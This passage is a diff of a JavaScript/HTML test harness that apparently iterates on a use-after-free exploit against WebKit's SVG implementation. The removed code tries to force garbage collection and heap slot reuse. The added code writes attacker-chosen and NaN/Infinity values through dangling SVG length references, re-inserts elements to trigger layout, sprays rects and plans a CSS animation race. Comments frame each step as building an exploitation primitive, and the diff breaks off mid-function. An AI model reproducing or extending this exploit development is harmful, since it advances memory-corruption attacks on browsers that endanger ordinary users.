@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v24</title>
+<title>SVG UAF v25</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,15 +17,15 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v24 - true GC: never-appended + iframe nuke + gc() probe</h2>
-<div class="sub">v23: WeakRef alive after 20 rounds = DOM style system pins JSCell. v24: skip DOM insertion entirely, iframe teardown, gc() probe.</div>
-<svg id="livesvg" width="1" height="1" style="position:fixed;opacity:0;pointer-events:none"></svg>
+<h2>SVG UAF v25 - pivot: exploit dangling write directly, no slot reuse needed</h2>
+<div class="sub">v24: even never-appended elements never GC'd. Root cause: SVGElement C++ HashMap caches SVGAnimatedLength, mutual strong refs = never freed. Pivot: use bv_A dangling write as-is — it writes into live A C++ storage. Find what WebKit does with that storage.</div>
+<svg id="livesvg" width="200" height="200" style="position:fixed;opacity:0;pointer-events:none"></svg>
 <div id="controls">
-  <button onclick="runGCP()">GCP gc-probe</button>
-  <button onclick="runNAP()">NAP never-appended</button>
-  <button onclick="runIFR()">IFR iframe-nuke</button>
-  <button onclick="runIFW()">IFW iframe-weakref</button>
-  <button onclick="runCOR()">COR corrupt-chain</button>
+  <button onclick="runRLV()">RLV relive-write</button>
+  <button onclick="runLYT()">LYT layout-trigger</button>
+  <button onclick="runCHN()">CHN chain-access</button>
+  <button onclick="runMUL()">MUL multi-bv-spray</button>
+  <button onclick="runCSS()">CSS css-cascade</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -65,559 +65,405 @@ function dis(d) {
 }
 window.onerror = function(m, u, l, c) { log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad'); return false; };
 
-function gcPressure(n) {
-  var arr = [];
-  n = n || 1000;
-  for (var i = 0; i < n; i++) arr.push(new ArrayBuffer(4096));
-  arr = null;
+function mkRect(w, h) {
+  var r = document.createElementNS(SVG_NS, 'rect');
+  r.setAttribute('width',  '' + (w || 80));
+  r.setAttribute('height', '' + (h || 80));
+  livesvg.appendChild(r);
+  return r;
 }
 
 /*
- * v23 diagnosis:
- *   WeakRef.deref() = [alive] for all 20 rounds even with A=null, bv_A=null
- *   => WebKit DOM style system keeps a C++ GC root on A's JSCell* after appendChild+remove
- *   => JSC sees that root and refuses to collect A's wrapper
- *   => We can never free A's C++ SVGRectElement as long as that root lives
+ * ROOT CAUSE CONFIRMED:
+ *   SVGElement C++ holds a strong ref to SVGAnimatedLength C++ via attr HashMap.
+ *   SVGAnimatedLength C++ holds m_contextElement back to SVGElement.
+ *   This creates a mutual strong ref cycle that JSC cannot collect.
+ *   WeakRef stays alive FOREVER. FinalizationRegistry never fires.
+ *   GC slot reuse is IMPOSSIBLE from JS without vm.gc().
  *
- * ROOT CAUSE CHAIN:
- *   livesvg.appendChild(A) -> WebKit StyleResolver / MutationObserver queue
- *                             creates a C++ JSCell* root for A
- *   A.remove() -> removes from render tree, GC root may persist
- *   A = null, bv_A = null -> no JS refs, but C++ root still pins JSCell
- *   WeakRef sees C++ root -> alive forever
+ * PIVOT STRATEGY:
+ *   We don't need slot reuse. We HAVE a confirmed float write into A's C++ storage.
+ *   bv_A.value = X writes X into A's m_baseVal float field even after A.remove().
+ *   A's C++ object is still ALIVE (confirmed by WeakRef).
+ *   So this is a write into a LIVE C++ object that WebKit doesn't expect to be written.
  *
- * v24 ANGLES:
+ * WHAT CAN WE DO WITH THIS WRITE?
  *
- * ANGLE 1: GCP - probe for gc() function
- *   JSC exposes gc() in debug/internal builds.
- *   Some WebKit versions leak it to web content via special flags.
- *   Also check: globalThis.gc, window.gc, GCController.collect
+ * Option A: RLV - RE-ADD A to DOM after bv_A write
+ *   After A.remove() and bv_A.value = ATTACK:
+ *   Re-append A to livesvg. WebKit re-attaches A's render object.
+ *   A.width.baseVal.value is now ATTACK.
+ *   Query A.getBoundingClientRect() or getComputedStyle(A).
+ *   This forces WebKit to use the corrupted value in a real layout pass.
+ *   Observe: does the bounding box reflect ATTACK value?
+ *   If yes: we can control layout calculations with arbitrary float values.
+ *   ATTACK can be NaN, Infinity, -Infinity, or a bit-pattern for type confusion.
  *
- * ANGLE 2: NAP - never-appended elements
- *   Create A with createElementNS but NEVER call appendChild.
- *   No DOM insertion = no StyleResolver pin = no C++ GC root.
- *   Ref chain is ONLY: bv_A(JS) -> SVGAnimatedLength(C++) -> SVGRectElement(C++)
- *   If we null bv_A FIRST then null A:
- *     - SVGAnimatedLength loses JS ref -> C++ SVGAnimatedLength freed
- *     - SVGRectElement loses m_contextElement holder
- *     - WeakRef(A) should die
- *   BUT: SVGAnimatedLength C++ holds strong ref to SVGRectElement via m_contextElement
- *        So we need BOTH A AND bv_A to be null for C++ chain to break
- *   Test: null bv_A first, then null A, check WeakRef
+ * Option B: LYT - LAYOUT CORRUPTION
+ *   Write SENTINEL=NaN or Infinity into removed A's fields.
+ *   Re-add A. Trigger layout. Read back via getBoundingClientRect.
+ *   Does WebKit sanitize the value or use it raw?
+ *   NaN in a length field = undefined behavior in the C++ renderer.
+ *   Could lead to OOB in layout buffer, or at least an interesting crash path.
  *
- * ANGLE 3: IFR - iframe nuke
- *   Create iframe, create A inside iframe's document
- *   Navigate iframe to about:blank -> tears down iframe JSC context
- *   Forces GC on iframe's entire heap
- *   All iframe elements freed
- *   Alloc B in main frame immediately after navigation
- *   But: A was in iframe's heap, B is in main frame's IsoHeap
- *        Different allocators! So this won't give us slot reuse.
- *   HOWEVER: what if we alloc B INSIDE iframe BEFORE navigation,
- *   then navigate? Both A and B were in iframe's heap...
- *   Actually we want: alloc B in MAIN frame, but A's slot is in IFRAME.
- *   These are different processes/heaps - won't work for slot reuse.
- *   BUT: iframe can tell us if GC fires at all -> use FinalizationRegistry inside iframe
- *   The key value: does iframe navigation trigger GC and finalizers?
+ * Option C: CHN - CHAIN THROUGH A TO SIBLING
+ *   A is removed. B is a live sibling in the same SVG.
+ *   WebKit may store A's sibling pointer or parent ref in A's C++ storage.
+ *   Write into A's attr fields, then re-add A, trigger a relayout.
+ *   Check if B's layout was affected (corrupted sibling traversal?).
  *
- * ANGLE 4: IFW - iframe with WeakRef
- *   Create A inside iframe, take WeakRef(A) inside iframe
- *   Navigate iframe -> check if WeakRef dies
- *   If yes: iframe navigation IS a GC trigger
- *   Then: create A in main frame, use same-iframe trick to trigger GC in main frame
- *   Actually: we want to force GC in MAIN frame where our A is
+ * Option D: MUL - MULTI-BV SPRAY
+ *   Create 100 rects, get bv for each, remove all, write to all.
+ *   Then read back. Check if any bv reads a different element's value.
+ *   If writes cross-contaminate: C++ attr HashMap has a bug where
+ *   multiple elements share the same attr slot.
  *
- * REAL PLAN for corruption:
- *   If NAP (never-appended) means WeakRef dies ->
- *   We can grab bv_A from a never-appended element
- *   Write sentinel via bv_A
- *   null bv_A, null A
- *   GC pressure -> WeakRef dies
- *   Alloc B (also never-appended) -> lands in A's slot
- *   Read B's uninitialized fields -> sentinel should be there
+ * Option E: CSS - CSS ANIMATION RACE
+ *   A is in DOM with a CSS animation on width.
+ *   Animation updates A.width.baseVal.value every frame via JS.
+ *   Simultaneously remove A in one RAF, write via bv_A in next.
+ *   The CSS animation engine may still be running on A's C++ fields
+ *   after A is removed from DOM if there's a race with the animation thread.
+ *   This is a genuine multi-threaded UAF if the animation compositor
+ *   runs on a separate thread in WebKit.
  *
- * But wait: we confirmed in v18/v19 that bv_A.value = 31337 works on
- *           APPENDED elements. Does it work on never-appended elements?
- *           SVGAnimatedLength.baseVal should exist for any SVGElement, not just appended.
- *           Let's test.
+ * v25 FOCUS: RLV + LYT = re-add A after corrupt write, trigger layout, observe effects.
+ * This converts our "write to removed element" into "write controls live layout".
+ * That's a much stronger primitive than slot-reuse alone.
  */
 
-// GCP: probe for gc() exposure
-async function runGCP(q) {
-  if (!q) { dis(true); sep(); log('GCP: probe for exposed gc() / GCController', 'inf'); sep(); }
+// RLV: write via bv_A, re-add A to DOM, check if corrupt value propagates
+async function runRLV(q) {
+  if (!q) { dis(true); sep(); log('RLV: bv_A write after remove, then re-add A to DOM', 'inf'); sep(); }
 
-  var gcFns = ['gc', 'GCController', 'collectGarbage', 'go', 'freeMemory'];
-  var found = [];
-  for (var i = 0; i < gcFns.length; i++) {
-    var name = gcFns[i];
-    var val = null;
-    try { val = typeof window[name]; } catch(e) {}
-    log('  window.' + name + ' = ' + val, val !== 'undefined' ? 'bad' : 'dim');
-    if (val !== 'undefined') found.push(name);
-  }
+  log('[*] baseline: A in DOM, write, readback', 'ok');
 
-  // Try calling gc() if it exists
-  var gcCallable = false;
-  if (found.indexOf('gc') !== -1) {
-    try {
-      gc();
-      gcCallable = true;
-      log('  gc() called successfully!', 'bad');
-    } catch(e) {
-      log('  gc() exists but threw: ' + e, 'inf');
-    }
-  }
-
-  // Probe webkit-specific internals
-  var internals = ['internals', 'testRunner', 'layoutTestController', 'window.internals'];
-  for (var j = 0; j < internals.length; j++) {
-    var n = internals[j];
-    var v = null;
-    try { v = typeof window[n]; } catch(e2) {}
-    if (v !== 'undefined') {
-      log('  [!!] ' + n + ' exposed! type=' + v, 'bad');
-      found.push(n);
-    }
-  }
-
-  log('[*] GCP: gcExposed=' + (found.length > 0) + ' gcCallable=' + gcCallable, found.length > 0 ? 'bad' : 'inf');
-  if (!q) dis(false);
-  return { gcExposed: found.length > 0, gcCallable: gcCallable, found: found };
-}
-
-// NAP: never-appended elements - skip DOM insertion to avoid style system pin
-async function runNAP(q) {
-  if (!q) { dis(true); sep(); log('NAP: never-appended element - no style system pin', 'inf'); sep(); }
-
-  log('[*] test 1: can we grab bv_A from never-appended element?', 'ok');
-
-  // Create A but NEVER append to DOM
-  var A_det = document.createElementNS(SVG_NS, 'rect');
-  A_det.setAttribute('width', '80');
-  A_det.setAttribute('height', '60');
-  // DO NOT: livesvg.appendChild(A_det)
-
-  var bv_det = null;
-  var det_w = null;
-  try {
-    bv_det = A_det.width ? A_det.width.baseVal : null;
-    det_w = bv_det ? bv_det.value : null;
-  } catch(e) {
-    log('  [!] bv_A on detached element threw: ' + e, 'bad');
-  }
-  log('  A_det.width.baseVal.value = ' + det_w + ' (expect 80)', det_w === 80 ? 'ok' : 'bad');
-
-  // Write to detached element
-  var write_ok = false;
-  try {
-    if (bv_det) { bv_det.value = 31337; }
-    var rb = bv_det ? bv_det.value : null;
-    write_ok = (rb === 31337);
-    log('  write 31337 to detached bv_A, readback=' + rb, write_ok ? 'ok' : 'bad');
-  } catch(e) {
-    log('  write to detached bv_A threw: ' + e, 'bad');
-  }
-
-  log('');
-  log('[*] test 2: WeakRef on never-appended A after null bv_A + null A', 'ok');
-
-  var weakA = null;
-  var A2 = null;
-  var bv_A2 = null;
-  try {
-    A2 = document.createElementNS(SVG_NS, 'rect');
-    A2.setAttribute('width', '80');
-    // NO appendChild
-    bv_A2 = A2.width ? A2.width.baseVal : null;
-    weakA = new WeakRef(A2);
-    log('  A2 created (never-appended), weakRef registered', 'ok');
-  } catch(e) {
-    log('  setup threw: ' + e, 'bad');
-  }
-
-  // Drop bv_A2 first (breaks SVGAnimatedLength strong ref chain)
-  bv_A2 = null;
-  // Drop A2 (no more JS refs)
-  A2 = null;
-
-  log('  bv_A2=null, A2=null - all refs dropped', 'ok');
-
-  var collected = false;
-  for (var round = 0; round < 30; round++) {
-    gcPressure(1500);
-    await micro();
-    gcPressure(1500);
-    await raf();
-    await wait(30);
-
-    var alive = weakA ? weakA.deref() : null;
-    var status = alive ? '[alive]' : 'undefined';
-    log('  round=' + round + ': weakRef=' + status, alive ? 'dim' : 'bad');
-
-    if (!alive) {
-      collected = true;
-      log('  [!!] COLLECTED: A2 JS wrapper GC\'d after never-append + all-null', 'bad');
-      log('  [!!] no DOM insertion = no style system pin = GC works!', 'bad');
-      break;
-    }
-  }
-
-  if (!collected) {
-    log('  still alive after 30 rounds - even never-appended elements pinned?', 'inf');
-    log('  [*] bv_A may still hold C++ strong ref even after bv_A=null', 'inf');
-    log('  [*] SVGAnimatedLength may intern itself into element\'s attr map', 'inf');
-  }
-
-  log('[*] NAP: detachedBvWorks=' + write_ok + ' gcCollected=' + collected, 'inf');
-  if (!q) dis(false);
-  return { detachedBvWorks: write_ok, gcCollected: collected };
-}
-
-// IFR: iframe nuke - test if iframe navigation triggers GC
-async function runIFR(q) {
-  if (!q) { dis(true); sep(); log('IFR: iframe nuke - does navigation trigger GC?', 'inf'); sep(); }
-
-  // Create iframe
-  var iframe = document.createElement('iframe');
-  iframe.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px';
-  iframe.src = 'about:blank';
-  document.body.appendChild(iframe);
-  await wait(100);
-
-  var iframeWin = iframe.contentWindow;
-  var iframeDoc = iframe.contentDocument;
-
-  if (!iframeDoc) {
-    log('  [!] iframe not accessible', 'bad');
-    iframe.remove();
-    if (!q) dis(false);
-    return { finFired: false };
-  }
-
-  log('  iframe created, injecting SVG element + FinalizationRegistry...', 'ok');
-
-  // Inject code into iframe to create A with FinalizationRegistry
-  var finFired = false;
-  var iframeSVG_NS = 'http://www.w3.org/2000/svg';
-
-  // Create SVG element in iframe
-  var iSvg = iframeDoc.createElementNS(iframeSVG_NS, 'svg');
-  iSvg.setAttribute('width', '10');
-  iSvg.setAttribute('height', '10');
-  iframeDoc.body.appendChild(iSvg);
-
-  var iA = iframeDoc.createElementNS(iframeSVG_NS, 'rect');
-  iA.setAttribute('width', '80');
-  iA.setAttribute('height', '80');
-  iSvg.appendChild(iA);
-
-  // Set up FinalizationRegistry inside iframe's JS context
-  var iReg = null;
-  try {
-    iReg = new iframeWin.FinalizationRegistry(function(token) {
-      finFired = true;
-      log('  [!!] IFRAME FINALIZER FIRED: token=' + token, 'bad');
-      log('  [!!] iframe navigation IS a GC trigger!', 'bad');
-    });
-    iReg.register(iA, 'iA-token');
-    log('  FinalizationRegistry registered for iA', 'ok');
-  } catch(e) {
-    log('  FinalizationRegistry in iframe threw: ' + e, 'bad');
-  }
-
-  // Also try WeakRef in iframe
-  var iWeakA = null;
-  try {
-    iWeakA = new iframeWin.WeakRef(iA);
-  } catch(e) {}
-
-  // Drop iframe refs
-  iA = null;
-  iSvg = null;
-  iReg = null;
-
-  log('  all iframe refs dropped, navigating iframe...', 'ok');
-
-  // Navigate iframe - this should tear down the JS context
-  await new Promise(function(resolve) {
-    iframe.onload = resolve;
-    iframe.src = 'about:blank?v=2'; // different URL to force reload
-    setTimeout(resolve, 500); // fallback
-  });
-
-  log('  iframe navigated', 'ok');
-
-  // Give finalizers time to run
-  for (var round = 0; round < 5; round++) {
-    gcPressure(500);
-    await micro();
-    await raf();
-    await wait(100);
-    log('  post-nav round=' + round + ' finFired=' + finFired, finFired ? 'bad' : 'dim');
-    if (finFired) break;
-  }
-
-  // Check WeakRef (may be invalid now since iframe context is gone)
-  var iWeakStatus = '?';
-  try {
-    iWeakStatus = iWeakA ? (iWeakA.deref() ? '[alive]' : 'undefined') : 'no-weakref';
-  } catch(e) {
-    iWeakStatus = 'threw:' + e.message;
-  }
-  log('  iWeakRef after nav: ' + iWeakStatus, 'inf');
-
-  iframe.remove();
-
-  log('[*] IFR: finFired=' + finFired, finFired ? 'bad' : 'inf');
-  if (!q) dis(false);
-  return { finFired: finFired };
-}
-
-// IFW: iframe WeakRef approach - alloc A in iframe, detect death, alloc B in main frame
-async function runIFW(q) {
-  if (!q) { dis(true); sep(); log('IFW: iframe WeakRef - A in iframe, B in main frame at iframe death', 'inf'); sep(); }
-
-  log('[*] theory: iframe death forces GC on iframe heap, B alloc in main frame', 'ok');
-  log('[*] problem: A and B in different heap contexts - reuse unlikely', 'ok');
-  log('[*] BUT: WebKit may use single process IsoHeap shared across frames', 'ok');
-  log('[*] test: alloc A in iframe, nav iframe, alloc B in main - check sentinel', 'ok');
-  log('');
-
-  var SENTINEL = 98765.0;
-
-  var iframe = document.createElement('iframe');
-  iframe.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px';
-  iframe.src = 'about:blank';
-  document.body.appendChild(iframe);
-  await wait(100);
-
-  var iframeDoc = iframe.contentDocument;
-  if (!iframeDoc) {
-    log('  iframe not accessible', 'bad');
-    iframe.remove();
-    if (!q) dis(false);
-    return { reused: false };
-  }
-
-  var iframeSVG_NS = 'http://www.w3.org/2000/svg';
-  var iSvg = iframeDoc.createElementNS(iframeSVG_NS, 'svg');
-  iSvg.setAttribute('width', '10');
-  iSvg.setAttribute('height', '10');
-  iframeDoc.body.appendChild(iSvg);
-
-  var iA = iframeDoc.createElementNS(iframeSVG_NS, 'rect');
-  iA.setAttribute('width', '80');
-  iSvg.appendChild(iA);
+  var A = mkRect(80, 80);
   await raf();
+  var bv_AW = A.width  ? A.width.baseVal  : null;
+  var bv_AH = A.height ? A.height.baseVal : null;
 
-  // Write sentinel into iA's height field
-  var ibv_AH = iA.height ? iA.height.baseVal : null;
-  try {
-    if (ibv_AH) ibv_AH.value = SENTINEL;
-    var rb = ibv_AH ? ibv_AH.value : null;
-    log('  iA created in iframe, SENTINEL=' + rb + ' written to iA.height', rb === SENTINEL ? 'ok' : 'bad');
-  } catch(e) {
-    log('  sentinel write threw: ' + e, 'bad');
-  }
+  var w0 = bv_AW ? bv_AW.value : null;
+  log('  baseline A.width.baseVal=' + w0, 'ok');
 
-  // Drop all refs
-  iA = null; iSvg = null; ibv_AH = null;
-
-  // Navigate iframe to free A
-  await new Promise(function(resolve) {
-    iframe.onload = resolve;
-    iframe.src = 'about:blank?v=3';
-    setTimeout(resolve, 300);
-  });
-
-  await raf();
-  gcPressure(2000);
-  await micro();
-  gcPressure(2000);
-  await raf();
-
-  // Alloc B in MAIN frame immediately
-  var B = document.createElementNS(SVG_NS, 'rect');
-  B.setAttribute('width', '55');
-  // don't set height
-  livesvg.appendChild(B);
+  // Remove A
+  A.remove();
   await micro();
 
-  var bv_BH = B.height ? B.height.baseVal : null;
-  var B_h = null;
-  try { B_h = bv_BH ? bv_BH.value : null; } catch(e) {}
-  log('  B allocd in main frame: B.height=' + B_h + ' (sentinel=' + SENTINEL + ')', B_h === SENTINEL ? 'bad' : 'dim');
+  // Write ATTACK value into A's C++ fields via dangling bv
+  var ATTACK = 999.0;
+  try { if (bv_AW) bv_AW.value = ATTACK; } catch(e) { log('  bv_AW.value write threw: ' + e, 'bad'); }
+  try { if (bv_AH) bv_AH.value = ATTACK + 1; } catch(e) {}
 
-  var reused = (B_h === SENTINEL);
-  if (reused) {
-    log('  [!!] CROSS-FRAME REUSE: iframe A slot = main frame B slot!', 'bad');
-    log('  [!!] WebKit uses shared IsoHeap across frames', 'bad');
+  var rb_w = null; var rb_h = null;
+  try { rb_w = bv_AW ? bv_AW.value : null; } catch(e) {}
+  try { rb_h = bv_AH ? bv_AH.value : null; } catch(e) {}
+  log('  after remove+write: bv_AW.value=' + rb_w + ' bv_AH.value=' + rb_h,
+      rb_w === ATTACK ? 'bad' : 'inf');
+
+  // RE-ADD A to DOM
+  log('[*] re-adding A to DOM after corrupt write...', 'inf');
+  livesvg.appendChild(A);
+  await raf();
+
+  // Read A's current attribute values
+  var A_w_attr  = A.getAttribute('width');
+  var A_h_attr  = A.getAttribute('height');
+  var A_bv_w2   = A.width  ? A.width.baseVal.value  : null;
+  var A_bv_h2   = A.height ? A.height.baseVal.value : null;
+  log('  re-added A.getAttribute(width)=' + A_w_attr, 'ok');
+  log('  re-added A.width.baseVal.value=' + A_bv_w2, A_bv_w2 === ATTACK ? 'bad' : 'ok');
+  log('  re-added A.height.baseVal.value=' + A_bv_h2, A_bv_h2 === ATTACK+1 ? 'bad' : 'ok');
+
+  // Trigger layout
+  var bbox = null;
+  try { bbox = A.getBoundingClientRect(); } catch(e) { log('  getBoundingClientRect threw: ' + e, 'bad'); }
+  if (bbox) {
+    log('  A.getBoundingClientRect: w=' + bbox.width + ' h=' + bbox.height, 'inf');
+    log('  [*] layout used w=' + bbox.width + ' (attack=' + ATTACK + ')', bbox.width === ATTACK ? 'bad' : 'ok');
   }
 
-  B.remove();
-  iframe.remove();
+  // Check computed style
+  var cs = null;
+  try { cs = window.getComputedStyle(A); } catch(e) {}
+  if (cs) {
+    var cs_w = cs.width;
+    log('  getComputedStyle(A).width=' + cs_w, 'inf');
+  }
 
-  log('[*] IFW: reused=' + reused, reused ? 'bad' : 'inf');
+  A.remove();
+  log('[*] RLV: bv_A write persists into re-added element = ' + (A_bv_w2 === ATTACK), A_bv_w2 === ATTACK ? 'bad' : 'ok');
   if (!q) dis(false);
-  return { reused: reused };
+  return { writePersists: A_bv_w2 === ATTACK, bboxW: bbox ? bbox.width : null };
 }
 
-// COR: full corruption chain - try all methods for genuine slot reuse
-async function runCOR(q) {
-  if (!q) { dis(true); sep(); log('COR: full corruption - NAP then sentinel confirm', 'inf'); sep(); }
+// LYT: write NaN/Infinity into removed A's fields, re-add, trigger layout
+async function runLYT(q) {
+  if (!q) { dis(true); sep(); log('LYT: write NaN/Infinity into removed A, trigger layout via re-add', 'inf'); sep(); }
 
-  var SENTINEL = 98765.0;
-  var reused = false;
+  var specialVals = [
+    { name: 'NaN',      val: NaN },
+    { name: 'Infinity', val: Infinity },
+    { name: '-Inf',     val: -Infinity },
+    { name: '1e38',     val: 1e38 },
+    { name: '-1e38',    val: -1e38 }
+  ];
 
-  // Strategy: never-appended A, write sentinel via bv_A,
-  // null bv_A (break SVGAnimatedLength C++ strong ref),
-  // null A (no more JS refs to SVGRectElement),
-  // GC pressure, alloc B never-appended with only width set,
-  // read B.height - if SENTINEL then slot reused
+  var results = [];
 
-  for (var attempt = 0; attempt < 15 && !reused; attempt++) {
-    // Clear any lingering elements
-    while (livesvg.firstChild) livesvg.removeChild(livesvg.firstChild);
+  for (var i = 0; i < specialVals.length; i++) {
+    var sv = specialVals[i];
+    var A = mkRect(80, 80);
     await raf();
 
-    // Create A - NEVER appended
-    var A = document.createElementNS(SVG_NS, 'rect');
-    A.setAttribute('width', '80');
-    A.setAttribute('height', '60');
-    A.setAttribute('rx', '12');
-    // NO appendChild
+    var bv_AW = A.width  ? A.width.baseVal  : null;
+    var bv_AH = A.height ? A.height.baseVal : null;
 
-    var bv_AH = null;
-    var bv_ARX = null;
-    var bv_AX = null;
+    A.remove();
+    await micro();
+
+    // Write special value
+    var written_w = null; var written_h = null;
+    try { if (bv_AW) bv_AW.value = sv.val; written_w = bv_AW.value; } catch(e) {}
+    try { if (bv_AH) bv_AH.value = sv.val; written_h = bv_AH.value; } catch(e) {}
+
+    // Re-add and trigger layout
+    livesvg.appendChild(A);
+    await raf();
+
+    var bv_w2 = null;
+    try { bv_w2 = A.width ? A.width.baseVal.value : null; } catch(e) {}
+
+    var bbox_w = null; var bbox_h = null;
     try {
-      bv_AH  = A.height ? A.height.baseVal : null;
-      bv_ARX = A.rx     ? A.rx.baseVal     : null;
-      bv_AX  = A.x      ? A.x.baseVal      : null;
+      var bbox = A.getBoundingClientRect();
+      bbox_w = bbox.width; bbox_h = bbox.height;
     } catch(e) {}
 
-    // Write sentinels into A's fields
-    var s_ok = false;
-    try {
-      if (bv_AH)  bv_AH.value  = SENTINEL;
-      if (bv_ARX) bv_ARX.value = SENTINEL + 1;
-      if (bv_AX)  bv_AX.value  = SENTINEL + 2;
-      var rb_h  = bv_AH  ? bv_AH.value  : null;
-      var rb_rx = bv_ARX ? bv_ARX.value : null;
-      s_ok = (rb_h === SENTINEL);
-    } catch(e) {}
+    var survived = (written_w === sv.val || isNaN(sv.val) && isNaN(written_w));
+    log('  val=' + sv.name + ': written_w=' + written_w + ' after_readback=' + bv_w2 + ' bbox_w=' + bbox_w,
+        survived ? 'bad' : 'dim');
+    results.push({ name: sv.name, written: written_w, readback: bv_w2, bboxW: bbox_w, survived: survived });
 
-    if (attempt === 0) {
-      log('  sentinel writes to never-appended A: ok=' + s_ok, s_ok ? 'ok' : 'bad');
-      if (!s_ok) {
-        log('  [!] cant write to never-appended elements - different code path', 'bad');
-        break;
+    A.remove();
+    await micro();
+  }
+
+  var anyNan   = results.some(function(r) { return isNaN(r.readback) && r.name === 'NaN'; });
+  var anyInf   = results.some(function(r) { return !isFinite(r.readback) && r.survived; });
+  var anyLarge = results.some(function(r) { return r.bboxW && Math.abs(r.bboxW) > 1000; });
+
+  log('[*] LYT: NaN survived=' + anyNan + ' Inf survived=' + anyInf + ' large bbox=' + anyLarge,
+      anyNan || anyInf ? 'bad' : 'ok');
+  if (!q) dis(false);
+  return { anyNan: anyNan, anyInf: anyInf, anyLarge: anyLarge, results: results };
+}
+
+// CHN: chain write - remove A, write into A, check if live sibling B is affected
+async function runCHN(q) {
+  if (!q) { dis(true); sep(); log('CHN: chain write - does bv_A write affect live sibling B?', 'inf'); sep(); }
+
+  log('[*] A and B siblings in same SVG, remove A, write via bv_A, check B', 'ok');
+
+  var A = mkRect(80, 80);
+  var B = mkRect(42, 42);
+  await raf();
+
+  var bv_AW = A.width  ? A.width.baseVal  : null;
+  var bv_AH = A.height ? A.height.baseVal : null;
+  var B_w0  = B.width  ? B.width.baseVal.value : null;
+  var B_h0  = B.height ? B.height.baseVal.value : null;
+  log('  baseline: A.w=80 B.w=' + B_w0 + ' B.h=' + B_h0, 'ok');
+
+  // Remove A
+  A.remove();
+  await micro();
+
+  // Write ATTACK into A's fields
+  var ATTACK = 31337.0;
+  try { if (bv_AW) bv_AW.value = ATTACK; } catch(e) {}
+  try { if (bv_AH) bv_AH.value = ATTACK; } catch(e) {}
+  await raf(); // trigger layout pass with corrupted A state
+
+  // Check B's values
+  var B_w1 = null; var B_h1 = null;
+  try { B_w1 = B.width  ? B.width.baseVal.value  : null; } catch(e) {}
+  try { B_h1 = B.height ? B.height.baseVal.value : null; } catch(e) {}
+
+  var B_affected = (B_w1 !== B_w0 || B_h1 !== B_h0);
+  log('  after bv_A write: B.w=' + B_w1 + ' B.h=' + B_h1 + ' affected=' + B_affected,
+      B_affected ? 'bad' : 'ok');
+
+  // Also check A's bbox via getBoundingClientRect (A is removed, should throw or return zero)
+  var A_bbox = null;
+  try { A_bbox = A.getBoundingClientRect(); } catch(e) {}
+  if (A_bbox) log('  removed A.getBoundingClientRect: w=' + A_bbox.width, 'inf');
+
+  // Try re-adding A while B is live, check if B is pushed or corrupted
+  livesvg.appendChild(A);
+  await raf();
+  var B_w2 = null; var B_h2 = null;
+  try { B_w2 = B.width  ? B.width.baseVal.value  : null; } catch(e) {}
+  try { B_h2 = B.height ? B.height.baseVal.value : null; } catch(e) {}
+  log('  after re-add A: B.w=' + B_w2 + ' B.h=' + B_h2, B_w2 !== B_w0 ? 'bad' : 'ok');
+
+  A.remove(); B.remove();
+  log('[*] CHN: B affected=' + B_affected, B_affected ? 'bad' : 'ok');
+  if (!q) dis(false);
+  return { B_affected: B_affected };
+}
+
+// MUL: spray many rects, get bv for all, remove all, write to all, check for cross-contamination
+async function runMUL(q) {
+  if (!q) { dis(true); sep(); log('MUL: spray N rects, remove all, write via all bvs, check cross-talk', 'inf'); sep(); }
+
+  var N = 64;
+  var SENTINEL_BASE = 10000.0;
+  log('[*] spraying ' + N + ' rects, each gets unique sentinel', 'ok');
+
+  var rects = [];
+  var bvs = [];
+  for (var i = 0; i < N; i++) {
+    var r = mkRect(50 + i, 50 + i);
+    rects.push(r);
+    bvs.push(r.width ? r.width.baseVal : null);
+  }
+  await raf();
+
+  // Remove all
+  for (var j = 0; j < N; j++) { try { rects[j].remove(); } catch(e) {} }
+  await micro();
+
+  // Write unique sentinel to each via its bv
+  for (var k = 0; k < N; k++) {
+    try { if (bvs[k]) bvs[k].value = SENTINEL_BASE + k; } catch(e) {}
+  }
+  await micro();
+
+  // Read back all - check for cross-contamination
+  var mismatches = 0;
+  var first_mismatch = null;
+  for (var m = 0; m < N; m++) {
+    var expected = SENTINEL_BASE + m;
+    var actual = null;
+    try { actual = bvs[m] ? bvs[m].value : null; } catch(e) {}
+    if (actual !== expected) {
+      mismatches++;
+      if (!first_mismatch) {
+        first_mismatch = { idx: m, expected: expected, actual: actual };
+        log('  [!!] MISMATCH idx=' + m + ': expected=' + expected + ' actual=' + actual, 'bad');
       }
     }
-
-    // Drop ALL refs - bv first to break C++ chain, then A
-    bv_AH = null; bv_ARX = null; bv_AX = null;
-    A = null;
-
-    // Scale up GC pressure by attempt
-    var rounds = 2 + Math.floor(attempt / 3);
-    for (var r = 0; r < rounds; r++) {
-      gcPressure(2000);
-      await micro();
-      gcPressure(2000);
-      await raf();
-      await wait(20 + attempt * 10);
-    }
-
-    // Alloc B - NEVER appended, width only
-    var B = document.createElementNS(SVG_NS, 'rect');
-    B.setAttribute('width', '55');
-    // NO height, rx, x set
-    // Also don't append
-
-    var bv_BH  = null;
-    var bv_BRX = null;
-    var bv_BX  = null;
-    var B_h = null, B_rx = null, B_x = null;
-    try {
-      bv_BH  = B.height ? B.height.baseVal : null;
-      bv_BRX = B.rx     ? B.rx.baseVal     : null;
-      bv_BX  = B.x      ? B.x.baseVal      : null;
-      B_h  = bv_BH  ? bv_BH.value  : null;
-      B_rx = bv_BRX ? bv_BRX.value : null;
-      B_x  = bv_BX  ? bv_BX.value  : null;
-    } catch(e) {}
-
-    var hit = (B_h === SENTINEL || B_rx === SENTINEL + 1 || B_x === SENTINEL + 2);
-    log('  attempt=' + attempt + ': B_h=' + B_h + ' B_rx=' + B_rx + ' B_x=' + B_x + ' hit=' + hit,
-        hit ? 'bad' : 'dim');
-
-    if (hit) {
-      reused = true;
-      var which = B_h === SENTINEL ? 'height' : B_rx === SENTINEL+1 ? 'rx' : 'x';
